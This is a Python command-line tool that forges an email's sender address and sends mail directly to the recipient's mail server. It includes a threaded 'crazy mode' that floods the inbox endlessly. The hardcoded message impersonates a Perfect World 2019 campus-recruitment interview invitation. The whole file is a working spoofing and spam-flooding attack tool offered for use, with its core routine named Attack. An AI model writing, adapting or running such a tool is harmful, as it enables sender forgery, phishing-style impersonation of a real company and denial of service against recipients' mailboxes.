# -*- coding: utf-8 -*-
import socket
from time import sleep
import random
import threading
import dns.resolver
import argparse
import signal
import sys


class FakeEmail:
    def __init__(self, to_addr, from_addr, SMTP_addr, port=25, timeout=10):
        Print(u"check config", sign=u"[+]")
        Print(u"to address: "+to_addr)
        Print(u"from address: "+from_addr)
        Print(u"SMTP address: "+SMTP_addr)
        Print(u"SMTP port: "+str(port))
        Print(u"socket timeout: "+str(timeout))
        Print(u"verbose level: "+str(verbose))
        Print(u"no problem, maybe", sign=u"  [*]")

        self.to_addr = to_addr
        self.from_addr = from_addr
        self.port = port
        self.timeout = timeout
        self.SMTP_addr = SMTP_addr
        self.quit_flag = 1

    def Connect(self):
        self.sk = socket.socket()
        self.sk.settimeout(self.timeout)

        try:
            Print(u"connect to %s:%s " % (self.SMTP_addr, str(self.port)), sign=u"[+]")
            self.sk.connect((self.SMTP_addr, self.port))
        except Exception as e:
            return (0, str(e))

        return self.Recv(check=u"220")

    def Send(self, msg):
        for result in msg.split(u"\r\n"):
            try:
                self.sk.sendall((result+u"\r\n").encode("utf8"))
                Print(result, threshold=1, color=u"yellow", sign=u"=> ")
            except Exception as e:
                Print(str(e), threshold=0, color=u"red", sign=u"=> ")
                return 0
        return 1

    def Recv(self, check=u"", threshold=1):
        try:
            data = [i.decode(u"utf8") for i in self.sk.recv(1024).split(b"\r\n") if i]
            assert data
        except AssertionError:
            if not check:
                Print(u"recv empty answer", threshold=0, color=u"red", sign=u"<= ")
            return (0, u"recv empty answer")
        except Exception as e:
            if not check:
                Print(str(e), threshold=0, color=u"red", sign=u"<= ")

            return (0, str(e))

        if check and check not in data[-1]:
            return (0, data[-1])

        if any([i for i in range(400, 600) if data[-1][:3] == str(i)]):
            Print(data[-1], threshold=0, color=u"red", sign=u"<= ")
            return (0, data[-1])

        for result in data:
            Print(result, threshold=threshold, color=u"green", sign=u"<= ")

        return (1, data[-1])

    def Attack(self, snum):
        global succ_num, failed_num, quit_flag, threads_alive

        while quit_flag and self.quit_flag:
            check_connect = self.Connect()
            if not check_connect[0]:
                Print(u"creating connection failed: "+u"I just got the answer: '%s' from %s" % (check_connect[1], self.SMTP_addr),
                      threshold=0, color=u"red", sign=u"[X]", flag=0)
                self.sk.close()
                failed_num += 1

                if crazy_mode:
                    continue
                else:
                    break

            Print(u"now, all ready", sign=u"  [*]")
            Print(u"using spam attack", sign=u"[+]")
            if not (self.Send(u"ehlo antispam") and self.Recv()[0]):
                failed_num += 1
                if crazy_mode:
                    continue
                else:
                    break

            while quit_flag and self.quit_flag:
                if not (self.Send(u"mail from:<%s>" % self.from_addr) and self.Recv()[0]) or\
                        not (self.Send(u"rcpt to:<%s>" % self.to_addr) and self.Recv()[0]) or\
                        not (self.Send(u"data") and self.Recv()[0]):
                    # self.sk.close()
                    failed_num += 1
                    if not crazy_mode:
                        self.quit_flag = 0
                    continue

                if self.Send(u"to: %s" % self.to_addr) and\
                    self.Send(u"from: %s" % self.from_addr) and\
                    self.Send(u"subject: 完美世界 2019 校园招聘") and\
                    self.Send(u"") and\
                    self.Send(
                    u"同学你好\r\n感谢你对完美世界校园招聘的关注，面试时间暂定为 9月20日 下午两点。如有疑问欢迎邮件交流~\r\n在茫茫宇宙中，在浩瀚银河里，有一个可以任你挥洒的世界，大家都抱着纯粹初心背负梦想前行，在这里，激情无限，跟志同道合的伙伴热血拼搏。在这里，秉持热爱，把梦想变成现实。在这里，精益求精，定义下一代未知的惊喜！\r\n."
                ):
                    result = self.Recv(threshold=0, check=u"250")
                    if result[0]:
                        succ_num += 1
                    else:
                        Print(result[1], threshold=0, color=u"red", sign=u"<= ")
                        failed_num += 1
                else:
                    failed_num += 1

                if not crazy_mode:
                    self.quit_flag = 0
                else:
                    sleep(random.random()*1.5)

        Print(u"all done", sign=u"  [*]")
        threads_alive[snum] = 0
        return self.sk.close()


def PutColor(string, color):
    colors = {
        u"gray": "2",
        u"red": "31",
        u"green": "32",
        u"yellow": "33",
        u"blue": "34",
        u"pink": "35",
        u"cyan": "36",
        u"white": "37",
    }

    return u"\033[40;1;%s;40m%s\033[0m" % (colors[color], string)


def Print(string, threshold=2, color=u"gray", sign=u"  [-]", flag=1):
    if verbose < threshold:
        return

    str_color = u"gray" if color == u"gray" else u"white"
    string = PutColor(sign, color)+PutColor(string, str_color)
    if verbose > 1 and threshold < 2 and flag:
        string = "  [-]"+string

    if Lock.acquire():
        print(string)
        Lock.release()


def DNSQuery(to_addr):
    resolver = dns.resolver.Resolver()
    resolver.timeout = 3
    resolver.lifetime = 3

    Print(u"query MX of DNS for %s" % to_addr, sign=u"[+]")

    try:
        SMTP_addr = b'.'.join(dns.resolver.query(
            to_addr[to_addr.find(u"@")+1:], u'MX')[0].exchange.labels).decode(u"utf8")
        assert SMTP_addr != u""
    except Exception as e:
        Print(u"query MX of %s failed: " % to_addr + str(e),
              threshold=0, color=u"red", sign=u"[X]", flag=0)
        return 0

    Print(u"success", sign=u"  [*]")
    return SMTP_addr


def Launcher(multi_num):
    if 0 < multi_num < 2:
        client = FakeEmail(to_addr, from_addr, SMTP_addr)
        client.Attack(0)
    else:
        threads = []
        for i in range(multi_num):
            client = FakeEmail(to_addr, from_addr, SMTP_addr=SMTP_addr)
            t = threading.Thread(target=client.Attack, args=(i,))
            t.start()
            threads.append(t)

        if not crazy_mode:
            for t in threads:
                t.join()


def quit(signum, frame):
    global quit_flag

    quit_flag = 0
    while any(threads_alive) and threads_num != 1:
        pass

    print(u"\n%s %s" % (PutColor(u"[*]success:", u"green"), succ_num))
    print(u"%s %s\n" % (PutColor(u"[!]failed:", u"red"), failed_num))
    print(PutColor(random.choice([
        u"Goodbye", u"Have a nice day",
        u"See you later", u"Bye",
        u"Farewell", u"Cheerio",
    ]), u"white"))
    sys.exit()


succ_num = 0
failed_num = 0
quit_flag = 1
signal.signal(signal.SIGINT, quit)
signal.signal(signal.SIGTERM, quit)
parser = argparse.ArgumentParser()
parser.add_argument(u"-faddr", u"--from_address", help=u"fake from address", required=True)
parser.add_argument(u"-taddr", u"--to_address",
                    help=u"the address you want to delivery", required=True)
parser.add_argument(u"-tnum", u"--threads_num",
                    help=u"how many threads you want", default=1, type=int)
parser.add_argument(u"-v", u"--verbose", help=u"verbose level", default=-1, type=int)
parser.add_argument(u"-c", u"--crazy_mode",
                    help=u"Keep sending fake email (** Use with caution **)", default=0, type=int)
args = parser.parse_args()

from_addr = args.from_address
to_addr = args.to_address
threads_num = args.threads_num if args.threads_num > 0 else 1
verbose = args.verbose
crazy_mode = args.crazy_mode
threads_alive = [1]*threads_num

Lock = threading.Lock()
if verbose == -1:
    verbose = 0 if (threads_num > 1 or crazy_mode) else 1
else:
    if (threads_num > 1 or crazy_mode) and verbose:
        Print(u"It's not recommended to enable output(let verbose>1) in multi-threaded mode, change it to 0(let verbose=0)?",
              color=u"yellow", threshold=0, sign=u"[!]WARNING: ")
        if vars(__builtins__).get('raw_input', input)(u"  [-]type no/[yes]: ") != "no":
            verbose = 0
            Print(u"as you wish\n", color=u"white", threshold=0, sign=u"  [*]")
        else:
            Print(u"in a mess, of course\n", color=u"yellow", threshold=0, sign=u"  [!]")

SMTP_addr = DNSQuery(to_addr)

if SMTP_addr:
    Launcher(threads_num)

if crazy_mode and threads_num != 1:
    while 1:
        pass

quit(0, 0)
